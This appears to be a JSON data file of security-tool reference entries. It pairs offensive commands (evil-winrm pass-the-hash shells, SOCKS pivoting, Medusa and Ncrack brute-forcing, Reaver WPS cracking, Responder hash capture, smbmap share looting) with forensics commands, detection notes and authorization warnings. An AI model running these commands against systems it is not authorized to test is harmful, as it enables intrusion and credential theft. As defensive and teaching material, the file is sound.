 {"id":"post-evil-winrm","level":"advanced","requires":{"tool":"evil-winrm"},"updated":"2026-07","cat":"Post-Exploitation","team":"red","title":"WinRM shell (evil-winrm)","desc":"Interactive Windows shell over WinRM with file transfer and in-memory script loading.","danger":"Authorized access only; produces remote-service logons on the target.","tags":["post-ex","remote","active-directory"],"attack":["T1021.006"],"detect":"WinRM logons (Event 4624 type 3 to WSMan), wsmprovhost.exe spawns, and 5985/5986 traffic.","mitigate":"Restrict WinRM to admin hosts, require TLS, monitor 4624/wsmprovhost, and enforce least privilege.","code":{"linux":"# password\nevil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:administrator}} -p '{{PASS:Password1}}'\n# pass-the-hash\nevil-winrm -i {{TARGET:10.0.0.5}} -u {{USER:administrator}} -H {{NTLM:aad3b435b51404ee...}}"},"related":["post-pass-the-hash-ticket","post-remote-execution","post-remote-services-lateral"]},
 {"id":"post-proxychains","level":"advanced","requires":{"tool":"proxychains"},"updated":"2026-07","cat":"Post-Exploitation","team":"red","title":"Pivot through a SOCKS proxy (proxychains)","desc":"Route any TCP tool through a compromised host's SOCKS proxy to reach internal networks.","danger":"Authorized engagements only; tunnels tooling into internal segments.","tags":["post-ex","network"],"attack":["T1090"],"detect":"Unexpected SOCKS listeners on hosts; internal connections sourced from a single pivot.","mitigate":"Egress/east-west segmentation, monitor for proxy processes, and restrict lateral connectivity.","code":{"linux":"# set a SOCKS proxy in /etc/proxychains4.conf, e.g.  socks5 127.0.0.1 1080\nproxychains4 nmap -sT -Pn -p 445,3389 {{TARGET:10.10.10.0/24}}\nproxychains4 evil-winrm -i {{HOST:10.10.10.5}} -u {{USER:admin}} -p '{{PASS:pass}}'"},"related":["post-remote-services-lateral","post-evil-winrm"]},
 {"id":"for-binwalk","level":"intermediate","requires":{"tool":"binwalk"},"cat":"Forensics","team":"blue","title":"Firmware / file carving (binwalk)","desc":"Scan a binary or firmware image for embedded files and filesystems, then extract them.","tags":["forensics"],"code":{"linux":"binwalk {{FILE:firmware.bin}}          # scan for signatures\nbinwalk -e {{FILE:firmware.bin}}       # extract known types (into _firmware.bin.extracted/)"},"related":["for-foremost"]},
 {"id":"for-foremost","level":"intermediate","requires":{"tool":"foremost"},"cat":"Forensics","team":"blue","title":"File carving by signature (foremost)","desc":"Recover files from a disk image or raw device by header/footer signatures.","danger":"Carve to a different disk than the source to avoid overwriting evidence.","tags":["forensics","recovery"],"code":{"linux":"foremost -i {{IMAGE:disk.img}} -o output/       # -t jpg,pdf,doc to target types"},"related":["for-dd-image","for-binwalk"]},
 {"id":"for-steghide","level":"intermediate","requires":{"tool":"steghide"},"cat":"Forensics","team":"blue","title":"Hidden-data extraction (steghide)","desc":"Detect and extract data hidden with steghide in JPEG/BMP/WAV/AU carriers.","tags":["forensics"],"code":{"linux":"steghide info {{FILE:image.jpg}}                       # show embedded info\nsteghide extract -sf {{FILE:image.jpg}} -p '{{PASS:}}'   # extract (blank pass ok)"},"related":["osint-exiftool-meta"]},
 {"id":"re-radare2","level":"intermediate","requires":{"tool":"radare2"},"cat":"Forensics","team":"blue","title":"Reverse-engineer a binary (radare2)","desc":"Static/dynamic analysis: analyze functions, disassemble, and inspect strings/xrefs.","tags":["forensics","reference"],"code":{"linux":"r2 -A {{BIN:./sample}}     # -A auto-analyze, then:\n[0x0000] aaa            # deeper analysis\n[0x0000] afl            # list functions\n[0x0000] pdf @ main     # disassemble main\n[0x0000] iz             # strings in data"},"related":["re-gdb","for-volatility3"]},
 {"id":"re-gdb","level":"intermediate","requires":{"tool":"gdb"},"cat":"Forensics","team":"blue","title":"Debug a binary (gdb + pwndbg)","desc":"Dynamic analysis of native binaries: breakpoints, registers, memory, and stack.","tags":["forensics","reference"],"code":{"linux":"gdb -q {{BIN:./sample}}\n(gdb) break main\n(gdb) run {{ARGS:}}\n(gdb) info registers\n(gdb) x/32xw $rsp        # examine stack\n(gdb) continue"},"related":["re-radare2"]},
 {"id":"for-volatility3","level":"intermediate","requires":{"tool":"Volatility 3"},"cat":"Forensics","team":"blue","title":"Analyze a memory image (Volatility 3)","desc":"Triage a RAM capture: processes, network connections, command lines, and injected code.","danger":"Work on a copy of the memory image; record hashes for chain of custody.","tags":["forensics","memory"],"attack":["T1055"],"detect":"Look for hidden/hollowed processes, unusual parent-child chains, and unbacked executable memory.","mitigate":"N/A (analysis). Feed findings (IOCs, injected PIDs) into containment and detection rules.","code":{"linux":"vol -f {{DUMP:mem.lime}} windows.pslist\nvol -f {{DUMP:mem.lime}} windows.pstree\nvol -f {{DUMP:mem.lime}} windows.netscan\nvol -f {{DUMP:mem.lime}} windows.malfind    # injected/unbacked code"},"related":["for-memdump","ir-proc-hash"]},
 {"id":"tool-amass","updated":"2026-07","cat":"Tools","title":"amass","desc":"In-depth attack-surface mapping and subdomain enumeration (OWASP).","url":"https://www.kali.org/tools/amass/","license":"open source","platforms":["linux"],"tags":["recon","subdomain","osint","tools"],"steps":[{"title":"Enumerate subdomains passively","cmd":"amass enum -passive -d {{DOMAIN:example.com}}","note":"-passive collects subdomains only from OSINT data sources, never resolving or touching the target — the safe way to map attack surface."},{"title":"Go active with brute force","cmd":"amass enum -active -brute -d {{DOMAIN:example.com}}","note":"-active resolves names and -brute guesses new ones, finding more hosts but sending DNS queries the target can observe."},{"title":"Save results to a file","cmd":"amass enum -d {{DOMAIN:example.com}} -o subs.txt","optional":true,"note":"-o writes the subdomain list. Amass also stores everything in a local graph database for correlation across multiple runs."},{"title":"Review everything gathered","cmd":"amass db -d {{DOMAIN:example.com}} -show","optional":true,"note":"The db subcommand replays what previous runs discovered for the domain, so you can summarize findings without re-scanning."}],"install":{"linux":"sudo apt install amass"}},
 {"id":"tool-subfinder","updated":"2026-07","cat":"Tools","title":"subfinder","desc":"Fast passive subdomain discovery from many data sources (ProjectDiscovery).","url":"https://www.kali.org/tools/subfinder/","license":"open source","platforms":["linux"],"tags":["recon","subdomain","osint","tools"],"steps":[{"title":"Discover subdomains fast","cmd":"subfinder -d {{DOMAIN:example.com}}","note":"Aggregates many passive sources in seconds. Adding free API keys to the config file unlocks noticeably deeper results."},{"title":"Save and pipe to a prober","cmd":"subfinder -d {{DOMAIN:example.com}} -o subs.txt","optional":true,"note":"-o writes the results. The common chain is 'subfinder | httpx' to immediately learn which of the subdomains serve live websites."},{"title":"Use all sources, verbosely","cmd":"subfinder -d {{DOMAIN:example.com}} -all -v","optional":true,"note":"-all enables every source (slower, more thorough) and -v shows which source produced each name, useful for tuning."}],"install":{"linux":"sudo apt install subfinder"}},
 {"id":"tool-theharvester","updated":"2026-07","cat":"Tools","title":"theHarvester","desc":"Gather emails, subdomains, hosts, and names from public OSINT sources.","url":"https://www.kali.org/tools/theharvester/","license":"open source","platforms":["linux"],"tags":["osint","recon","mail","tools"],"steps":[{"title":"Gather OSINT across all sources","cmd":"theHarvester -d {{DOMAIN:example.com}} -b all","note":"-b all queries every configured source for emails, subdomains, hosts, and employee names associated with the domain — a fast footprint of the target."},{"title":"Query one specific source","cmd":"theHarvester -d {{DOMAIN:example.com}} -b bing","note":"-b selects a single source (bing, duckduckgo, crtsh, and more). Some sources need a free API key set in the config to return data."},{"title":"Write an HTML/JSON report","cmd":"theHarvester -d {{DOMAIN:example.com}} -b all -f report","optional":true,"note":"-f saves report.html and report.json so you can hand off findings or diff them against a later run."},{"title":"Cap results per source","cmd":"theHarvester -d {{DOMAIN:example.com}} -b all -l 200","optional":true,"note":"-l limits how many results are pulled from each source, keeping a broad sweep quick when you only need a sample."}],"install":{"linux":"sudo apt install theharvester"}},
 {"id":"tool-whatweb","updated":"2026-07","cat":"Tools","title":"WhatWeb","desc":"Fingerprint web technologies, frameworks, servers, and versions.","url":"https://www.kali.org/tools/whatweb/","license":"open source","platforms":["linux"],"tags":["web","recon","tools"],"steps":[{"title":"Fingerprint a website","cmd":"whatweb http://{{TARGET:example.com}}","note":"Identifies the web server, CMS, frameworks, JavaScript libraries, and versions from response fingerprints — a quick read of what a site is built on."},{"title":"Increase detection depth","cmd":"whatweb -a 3 http://{{TARGET:example.com}}","note":"-a sets aggression from 1 to 4; higher levels send more probes to pull out more detail, at the cost of being noisier and slower."},{"title":"Scan many hosts and log","cmd":"whatweb -i hosts.txt --log-brief=web.txt","optional":true,"note":"-i reads targets from a file and --log-brief writes a one-line-per-host summary, handy after a subdomain sweep."}],"install":{"linux":"sudo apt install whatweb"}},
 {"id":"tool-wafw00f","updated":"2026-07","cat":"Tools","title":"wafw00f","desc":"Identify and fingerprint the Web Application Firewall in front of a site.","url":"https://www.kali.org/tools/wafw00f/","license":"open source","platforms":["linux"],"tags":["web","recon","tools"],"steps":[{"title":"Detect a web application firewall","cmd":"wafw00f http://{{TARGET:example.com}}","note":"Sends crafted requests and matches the responses to name the WAF in front of a site (Cloudflare, AWS WAF, etc.), so you know what will filter your later testing."},{"title":"List the WAFs it can detect","cmd":"wafw00f -l","optional":true,"note":"-l prints every WAF signature wafw00f knows, useful for understanding what a negative result does and doesn't rule out."},{"title":"Test several targets and save","cmd":"wafw00f -i hosts.txt -o waf.json","optional":true,"note":"-i takes a list of URLs and -o writes structured results you can fold into a report."}],"install":{"linux":"sudo apt install wafw00f"}},
 {"id":"tool-nbtscan","updated":"2026-07","cat":"Tools","title":"nbtscan","desc":"Scan networks for NetBIOS name information (names, shares, MACs).","url":"https://www.kali.org/tools/nbtscan/","license":"open source","platforms":["linux"],"tags":["recon","smb","network","tools"],"steps":[{"title":"Scan a subnet for NetBIOS names","cmd":"sudo nbtscan {{RANGE:10.0.0.0/24}}","note":"Queries UDP 137 across the range and lists each host's IP, NetBIOS name, and often the logged-in user and domain/workgroup — a quick way to map Windows machines on a LAN."},{"title":"Show the full name table per host","cmd":"sudo nbtscan -v {{RANGE:10.0.0.0/24}}","optional":true,"note":"-v prints every registered NetBIOS name and service flag for each host, which reveals roles like domain controller, file server, or messenger."},{"title":"Output in a parsable format","cmd":"sudo nbtscan -s : {{RANGE:10.0.0.0/24}}","optional":true,"note":"-s sets a field separator (here a colon) so each result is one delimited line, easy to cut/grep into a follow-up target list."}],"install":{"linux":"sudo apt install nbtscan"}},
 {"id":"tool-enum4linux-ng","updated":"2026-07","cat":"Tools","title":"enum4linux-ng","desc":"Modern SMB/Windows enumeration: users, shares, groups, policy (rewrite of enum4linux).","url":"https://www.kali.org/tools/enum4linux-ng/","license":"open source","platforms":["linux"],"tags":["recon","smb","enumeration","tools"],"steps":[{"title":"Enumerate a host over SMB/RPC","cmd":"enum4linux-ng {{TARGET:10.0.0.5}}","note":"Pulls users, groups, shares, the password policy, and OS details, using a null session wherever the target allows it — a thorough anonymous first pass."},{"title":"Authenticate for deeper results","cmd":"enum4linux-ng -u {{USER:admin}} -p {{PASS:Password1}} {{TARGET:10.0.0.5}}","note":"Even low-privilege credentials reveal far more than an anonymous session, especially the full user and group listings."},{"title":"Save structured output","cmd":"enum4linux-ng -oJ out {{TARGET:10.0.0.5}}","optional":true,"note":"-oJ (JSON) or -oY (YAML) writes machine-readable results you can grep or feed into other tooling."}],"install":{"linux":"sudo apt install enum4linux-ng"}},
 {"id":"tool-smbmap","updated":"2026-07","cat":"Tools","title":"smbmap","desc":"Enumerate SMB shares and permissions across a host or network, with file ops.","url":"https://www.kali.org/tools/smbmap/","license":"open source","platforms":["linux"],"tags":["recon","smb","enumeration","tools"],"steps":[{"title":"List shares and your access","cmd":"smbmap -H {{TARGET:10.0.0.5}}","note":"Shows each share with your READ/WRITE level using a null or guest session — the quickest way to spot an anonymously readable share."},{"title":"Authenticate to see more","cmd":"smbmap -H {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}}","note":"Credentials usually expose additional shares and higher permissions than the anonymous view."},{"title":"Browse a share recursively","cmd":"smbmap -H {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}} -r {{SHARE:C$}}","note":"-r lists a share's directory tree so you can hunt for interesting files without opening an interactive session."},{"title":"Download or upload a file","cmd":"smbmap -H {{TARGET:10.0.0.5}} -u {{USER:admin}} -p {{PASS:Password1}} --download '{{SHARE:C$}}\\Users\\Public\\file.txt'","optional":true,"note":"--download pulls a file straight off the share (and --upload pushes one), so you can retrieve loot in a single command."}],"install":{"linux":"sudo apt install smbmap"}},
 {"id":"tool-sslscan","updated":"2026-07","cat":"Tools","title":"sslscan","desc":"Query a server's supported SSL/TLS versions, ciphers, and certificate.","url":"https://www.kali.org/tools/sslscan/","license":"open source","platforms":["linux"],"tags":["tls","certificates","network","tools"],"steps":[{"title":"Audit a server's TLS configuration","cmd":"sslscan {{HOST:example.com}}:443","note":"Connects and enumerates the supported SSL/TLS versions, cipher suites, key-exchange strength, and certificate. Deprecated protocols (SSLv3, TLS 1.0/1.1) and weak ciphers are highlighted as findings."},{"title":"Inspect just the certificate","cmd":"sslscan --show-certificate --no-ciphersuites {{HOST:example.com}}","optional":true,"note":"Focuses on the certificate — issuer, validity dates, key size, and signature algorithm — without the full cipher enumeration, so you can spot an expired or weakly-signed cert fast."},{"title":"Test a STARTTLS service","cmd":"sslscan --starttls-smtp {{HOST:mail.example.com}}:25","optional":true,"note":"Mail and other protocols upgrade to TLS mid-session; the --starttls-smtp/imap/pop3/ftp flags tell sslscan to negotiate that upgrade before auditing the encryption."},{"title":"Save output for reporting","cmd":"sslscan --xml=ssl.xml {{HOST:example.com}}","optional":true,"note":"Writes machine-readable XML you can diff over time or import into a report, rather than only printing to the terminal."}],"install":{"linux":"sudo apt install sslscan"}},
 {"id":"tool-searchsploit","updated":"2026-07","cat":"Tools","title":"searchsploit (Exploit-DB)","desc":"Offline command-line search of the Exploit-DB archive of exploits and shellcode.","url":"https://www.kali.org/tools/exploitdb/","license":"open source","platforms":["linux"],"tags":["exploitation","reference","tools"],"steps":[{"title":"Search Exploit-DB offline","cmd":"searchsploit {{TERM:apache 2.4}}","note":"Searches the local copy of Exploit-DB for matching exploits and proof-of-concepts — no internet needed, so it works on an isolated engagement network."},{"title":"Read an exploit's details","cmd":"searchsploit -x {{EDBID:50383}}","note":"-x opens the exploit for reading (and -p prints just its file path), so you can review what it does before running anything."},{"title":"Copy an exploit locally","cmd":"searchsploit -m {{EDBID:50383}}","note":"-m mirrors the exploit into your current directory, ready to edit (set the target IP/port) and run."},{"title":"Update the local database","cmd":"searchsploit -u","optional":true,"note":"-u refreshes the offline Exploit-DB archive so your searches include the newest entries."}],"install":{"linux":"sudo apt install exploitdb"}},
 {"id":"tool-gobuster","updated":"2026-07","cat":"Tools","title":"gobuster","desc":"Fast brute-forcer for directories, DNS subdomains, and virtual hosts.","url":"https://www.kali.org/tools/gobuster/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"steps":[{"title":"Brute-force directories and files","cmd":"gobuster dir -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","note":"dir mode requests every entry in the wordlist and reports the HTTP status, revealing hidden pages, admin panels, and backup files the site doesn't link to."},{"title":"Also try common file extensions","cmd":"gobuster dir -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -x php,txt,bak","note":"-x appends each extension to every word (admin.php, config.bak), so you catch files as well as directories."},{"title":"Enumerate DNS subdomains","cmd":"gobuster dns -d {{DOMAIN:example.com}} -w {{WORDLIST:/usr/share/wordlists/dnsmap.txt}}","note":"dns mode resolves candidate subdomains from the wordlist — a fast way to expand the target's footprint."},{"title":"Discover virtual hosts","cmd":"gobuster vhost -u http://{{TARGET:example.com}} -w {{WORDLIST:/usr/share/wordlists/dnsmap.txt}}","optional":true,"note":"vhost mode finds name-based virtual hosts served from the same IP — sites you'd never reach by the address alone."},{"title":"Tune threads and hide noise","cmd":"gobuster dir -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -t 50 -b 404,403","optional":true,"note":"-t raises concurrency for speed and -b blacklists status codes so the output only shows interesting responses."}],"install":{"linux":"sudo apt install gobuster"}},
 {"id":"tool-feroxbuster","updated":"2026-07","cat":"Tools","title":"feroxbuster","desc":"Fast, recursive content discovery for web servers (Rust).","url":"https://www.kali.org/tools/feroxbuster/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"steps":[{"title":"Recursively discover content","cmd":"feroxbuster -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","note":"feroxbuster automatically recurses into each directory it finds and is very fast, so one command maps a whole site's structure."},{"title":"Test file extensions too","cmd":"feroxbuster -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -x php,txt,html","note":"-x tries each word with these extensions, turning a directory list into a directory-and-file search."},{"title":"Filter out noise","cmd":"feroxbuster -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -C 404 -S 0","optional":true,"note":"-C filters by status code and -S by response size, hiding the boilerplate 'not found' pages so real hits stand out."},{"title":"Limit recursion depth","cmd":"feroxbuster -u http://{{TARGET:10.0.0.5}} -w {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -d 2","optional":true,"note":"-d caps how deep the recursion goes, which keeps a large site from turning into an endless scan."}],"install":{"linux":"sudo apt install feroxbuster"}},
 {"id":"tool-dirb","updated":"2026-07","cat":"Tools","title":"dirb","desc":"Classic web content scanner that brute-forces directories and files.","url":"https://www.kali.org/tools/dirb/","license":"open source","platforms":["linux"],"tags":["web","enumeration","tools"],"steps":[{"title":"Scan for directories and files","cmd":"dirb http://{{TARGET:10.0.0.5}} {{WORDLIST:/usr/share/wordlists/dirb/common.txt}}","note":"dirb walks the wordlist against the URL and reports found paths, recursing into directories it discovers. Simple and dependable for a first content sweep."},{"title":"Look for specific extensions","cmd":"dirb http://{{TARGET:10.0.0.5}} {{WORDLIST:/usr/share/wordlists/dirb/common.txt}} -X .php,.bak","optional":true,"note":"-X tests each name with these suffixes, useful when you expect a particular server technology."},{"title":"Stop recursion and save output","cmd":"dirb http://{{TARGET:10.0.0.5}} -r -o dirb.txt","optional":true,"note":"-r keeps the scan to the top level (faster, less noise) and -o writes the results to a file."}],"install":{"linux":"sudo apt install dirb"}},
 {"id":"tool-dalfox","updated":"2026-07","cat":"Tools","title":"dalfox","desc":"Fast, parameter-analysis-based XSS scanner and testing tool.","url":"https://www.kali.org/tools/dalfox/","license":"open source","platforms":["linux"],"tags":["web","exploitation","tools"],"steps":[{"title":"Scan a URL parameter for XSS","cmd":"dalfox url 'http://{{TARGET:10.0.0.5}}/search?q=test'","note":"Analyzes each parameter, tests reflected and DOM-based XSS, and verifies which payloads actually fire — so it reports working issues rather than guesses."},{"title":"Scan many URLs from a pipe","cmd":"cat urls.txt | dalfox pipe","note":"pipe mode reads a list of URLs, making it easy to run straight after content discovery or a crawl."},{"title":"Test POST data","cmd":"dalfox url 'http://{{TARGET:10.0.0.5}}/comment' --data 'msg=test'","optional":true,"note":"--data supplies a POST body so dalfox can test form fields, not just query-string parameters."},{"title":"Save confirmed findings","cmd":"dalfox url 'http://{{TARGET:10.0.0.5}}/search?q=test' -o xss.txt","optional":true,"note":"-o records the verified XSS results for your report."}],"install":{"linux":"sudo apt install dalfox"}},
 {"id":"tool-medusa","updated":"2026-07","cat":"Tools","title":"Medusa","desc":"Fast, parallel, modular login brute-forcer for many network protocols.","url":"https://www.kali.org/tools/medusa/","license":"open source","platforms":["linux"],"tags":["password","network","tools"],"steps":[{"title":"Brute-force a service","cmd":"medusa -h {{TARGET:10.0.0.5}} -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -M ssh","note":"-h host, -u user, -P password list, and -M the module (ssh, ftp, smbnt, http, and more). Same idea as Hydra with a different engine."},{"title":"Sweep many hosts and users","cmd":"medusa -H hosts.txt -U users.txt -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -M ssh","note":"-H and -U take files of hosts and usernames. Medusa is designed for highly parallel, many-target runs, so it shines on large scopes."},{"title":"Stop on success and tune threads","cmd":"medusa -h {{TARGET:10.0.0.5}} -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} -M ssh -f -t 4","optional":true,"note":"-f stops once a valid login is found and -t sets threads — keep it low on lockout-sensitive services. Authorized targets only."}],"install":{"linux":"sudo apt install medusa"}},
 {"id":"tool-ncrack","updated":"2026-07","cat":"Tools","title":"Ncrack","desc":"High-speed network authentication cracker from the Nmap project.","url":"https://www.kali.org/tools/ncrack/","license":"open source","platforms":["linux"],"tags":["password","network","tools"],"steps":[{"title":"Crack a network login","cmd":"ncrack -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} ssh://{{TARGET:10.0.0.5}}","note":"From the Nmap project and tuned for network authentication, Ncrack handles ssh, rdp, ftp, and more with reliable timing controls."},{"title":"Target multiple ports or hosts","cmd":"ncrack -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} {{TARGET:10.0.0.5}}:22,3389","note":"List several ports or hosts and Ncrack picks the correct protocol module for each — convenient after an Nmap scan finds open auth services."},{"title":"Rate-limit to avoid lockouts","cmd":"ncrack -u {{USER:admin}} -P {{WORDLIST:/usr/share/wordlists/rockyou.txt}} --connection-limit 2 ssh://{{TARGET:10.0.0.5}}","optional":true,"note":"--connection-limit slows the attempts so you don't trip account lockouts or flood a fragile service. Authorized use only."}],"install":{"linux":"sudo apt install ncrack"}},
 {"id":"tool-crunch","updated":"2026-07","cat":"Tools","title":"crunch","desc":"Generate custom wordlists from a character set and pattern.","url":"https://www.kali.org/tools/crunch/","license":"open source","platforms":["linux"],"tags":["password","tools"],"steps":[{"title":"Generate words by length","cmd":"crunch 6 8 -o wordlist.txt","note":"Produces every combination from length 6 to 8 using the default character set and writes it to a file. Be careful — the size grows explosively with length."},{"title":"Restrict the character set","cmd":"crunch 8 8 abcdef0123456789 -o hex8.txt","note":"Passing an explicit charset targets a known format (here 8-character hex), which keeps the list to a realistic size."},{"title":"Follow a known pattern","cmd":"crunch 10 10 -t {{PATTERN:Pass@@@@}} -o pat.txt","note":"-t is a template: @ lowercase, comma uppercase, % digit, ^ symbol. Perfect when you know the password policy or a predictable prefix."},{"title":"Pipe candidates straight into a cracker","cmd":"crunch 6 6 -t {{PATTERN:@@@@@@}} | hashcat -m 0 hashes.txt","optional":true,"note":"Streaming crunch's output into hashcat or aircrack avoids writing an enormous file to disk — the list is consumed as it's generated."}],"install":{"linux":"sudo apt install crunch"}},
 {"id":"tool-cewl","updated":"2026-07","cat":"Tools","title":"CeWL","desc":"Spider a target site to build a custom wordlist from its content.","url":"https://www.kali.org/tools/cewl/","license":"open source","platforms":["linux"],"tags":["password","osint","tools"],"steps":[{"title":"Build a wordlist from a website","cmd":"cewl http://{{TARGET:example.com}} -w wordlist.txt","note":"Spiders the site and collects unique words. Real users often base passwords on company jargon, product names, and local terms, so a site-derived list beats a generic one."},{"title":"Set crawl depth and minimum length","cmd":"cewl http://{{TARGET:example.com}} -d 2 -m 6 -w wordlist.txt","note":"-d controls how deep it crawls and -m drops words shorter than the length you set, trimming filler out of the list."},{"title":"Also harvest email addresses","cmd":"cewl http://{{TARGET:example.com}} -e -w wordlist.txt","optional":true,"note":"-e collects any email addresses it encounters, which double as username candidates for later attacks."}],"install":{"linux":"sudo apt install cewl"}},
 {"id":"tool-hashid","updated":"2026-07","cat":"Tools","title":"hashID","desc":"Identify the probable type(s) of a given hash.","url":"https://www.kali.org/tools/hashid/","license":"open source","platforms":["linux"],"tags":["password","tools"],"steps":[{"title":"Identify a hash type","cmd":"hashid '{{HASH:5f4dcc3b5aa765d61d8327deb882cf99}}'","note":"Prints the likely algorithms for a hash string so you know what you're dealing with before choosing a cracking approach."},{"title":"Get the hashcat mode number","cmd":"hashid -m '{{HASH:5f4dcc3b5aa765d61d8327deb882cf99}}'","note":"-m adds the corresponding hashcat -m value, so you can plug the result straight into a hashcat command."},{"title":"Identify hashes from a file","cmd":"hashid -f hashes.txt","optional":true,"note":"-f reads a file of hashes (one per line) and labels each, handy when a dump contains mixed formats."}],"install":{"linux":"sudo apt install hashid"}},
 {"id":"tool-wifite","updated":"2026-07","cat":"Tools","title":"Wifite","desc":"Automated wireless auditor that wraps aircrack-ng, reaver, and hashcat.","url":"https://www.kali.org/tools/wifite/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"steps":[{"title":"Auto-audit nearby networks","cmd":"sudo wifite","note":"Puts the adapter into monitor mode, scans the air, and offers to attack each network (handshake, PMKID, or WPS). Press Ctrl-C to stop scanning and choose targets. Only audit networks you own or are authorized to test."},{"title":"Focus on one access point","cmd":"sudo wifite --bssid {{BSSID:AA:BB:CC:DD:EE:FF}} -c {{CHANNEL:6}}","note":"Restricting to a single BSSID and channel keeps the attack scoped to your target and avoids disturbing neighbouring networks."},{"title":"Limit to WPA handshake capture","cmd":"sudo wifite --wpa","optional":true,"note":"--wpa captures only the WPA handshake; --wps and --pmkid select the other attack methods when you want one specific approach."},{"title":"Crack captures with a wordlist","cmd":"sudo wifite --dict {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","optional":true,"note":"Points wifite at a wordlist so it attempts to crack any handshakes it captures, all in the same run."}],"install":{"linux":"sudo apt install wifite"}},
 {"id":"tool-reaver","updated":"2026-07","cat":"Tools","title":"Reaver","desc":"Brute-force WPS PINs to recover WPA/WPA2 passphrases.","url":"https://www.kali.org/tools/reaver/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"steps":[{"title":"Brute-force the WPS PIN","cmd":"sudo reaver -i {{MON:wlan0mon}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} -vv","note":"Attacks the access point's WPS to recover the WPA passphrase; the adapter must be in monitor mode. It can be slow, and it targets a network directly — your own AP only."},{"title":"Try the pixie-dust attack","cmd":"sudo reaver -i {{MON:wlan0mon}} -b {{BSSID:AA:BB:CC:DD:EE:FF}} -K 1 -vv","optional":true,"note":"-K runs the offline pixie-dust attack, which recovers the PIN in seconds against routers with weak WPS implementations — far faster than online brute force."},{"title":"Find WPS-enabled APs first","cmd":"sudo wash -i {{MON:wlan0mon}}","optional":true,"note":"wash (bundled with reaver) lists nearby access points that have WPS enabled and whether it's locked, so you don't waste time on unsuitable targets."}],"install":{"linux":"sudo apt install reaver"}},
 {"id":"tool-bully","updated":"2026-07","cat":"Tools","title":"Bully","desc":"Alternative WPS PIN brute-force implementation.","url":"https://www.kali.org/tools/bully/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"install":{"linux":"sudo apt install bully"}},
 {"id":"tool-hcxdumptool","updated":"2026-07","cat":"Tools","title":"hcxdumptool","desc":"Capture WPA PMKID/handshakes from Wi-Fi for offline cracking.","url":"https://www.kali.org/tools/hcxdumptool/","license":"open source","platforms":["linux"],"tags":["wireless","tools"],"steps":[{"title":"Capture PMKIDs and handshakes","cmd":"sudo hcxdumptool -i {{MON:wlan0mon}} -w capture.pcapng","note":"Collects WPA PMKIDs and handshakes into a pcapng file — a modern one-tool alternative to the airodump capture step. Needs root and monitor mode. (Older versions use -o instead of -w.)"},{"title":"Convert the capture for hashcat","cmd":"hcxpcapngtool -o hash.hc22000 capture.pcapng","note":"hcxpcapngtool turns the raw capture into hashcat's 22000 hash format, extracting the crackable material from the packets."},{"title":"Crack it with hashcat","cmd":"hashcat -m 22000 hash.hc22000 {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","optional":true,"note":"Mode 22000 covers both PMKID and handshake, so one command attacks whatever hcxdumptool captured against your wordlist."}],"install":{"linux":"sudo apt install hcxdumptool"}},
 {"id":"tool-kismet","updated":"2026-07","cat":"Tools","title":"Kismet","desc":"Wireless network detector, sniffer, and WIDS (passive wardriving).","url":"https://www.kali.org/tools/kismet/","license":"open source","platforms":["linux"],"tags":["wireless","network","tools"],"install":{"linux":"sudo apt install kismet"}},
 {"id":"tool-macchanger","updated":"2026-07","cat":"Tools","title":"macchanger","desc":"View and spoof (randomize) a network interface's MAC address.","url":"https://www.kali.org/tools/macchanger/","license":"open source","platforms":["linux"],"tags":["wireless","network","tools"],"install":{"linux":"sudo apt install macchanger"}},
 {"id":"tool-responder","updated":"2026-07","cat":"Tools","title":"Responder","desc":"LLMNR/NBT-NS/MDNS poisoner that captures NetNTLM hashes; includes relay tooling.","url":"https://www.kali.org/tools/responder/","license":"open source","platforms":["linux"],"tags":["exploitation","network","active-directory","tools"],"steps":[{"title":"Poison name queries and capture hashes","cmd":"sudo responder -I {{IFACE:eth0}}","note":"Responder answers LLMNR/NBT-NS/MDNS lookups, so misconfigured Windows hosts authenticate to you and leak NetNTLM hashes into its logs directory. Only run this on a network you're authorized to test."},{"title":"Observe without answering first","cmd":"sudo responder -I {{IFACE:eth0}} -A","optional":true,"note":"-A is analyze mode: it watches which name queries are flying around without poisoning anything, so you can gauge impact before actively responding."},{"title":"Crack a captured NetNTLMv2 hash","cmd":"hashcat -m 5600 hash.txt {{WORDLIST:/usr/share/wordlists/rockyou.txt}}","optional":true,"note":"NetNTLMv2 is hashcat mode 5600. Copy a captured hash from Responder's logs and crack it offline — or relay it instead if signing isn't enforced."}],"install":{"linux":"sudo apt install responder"}},
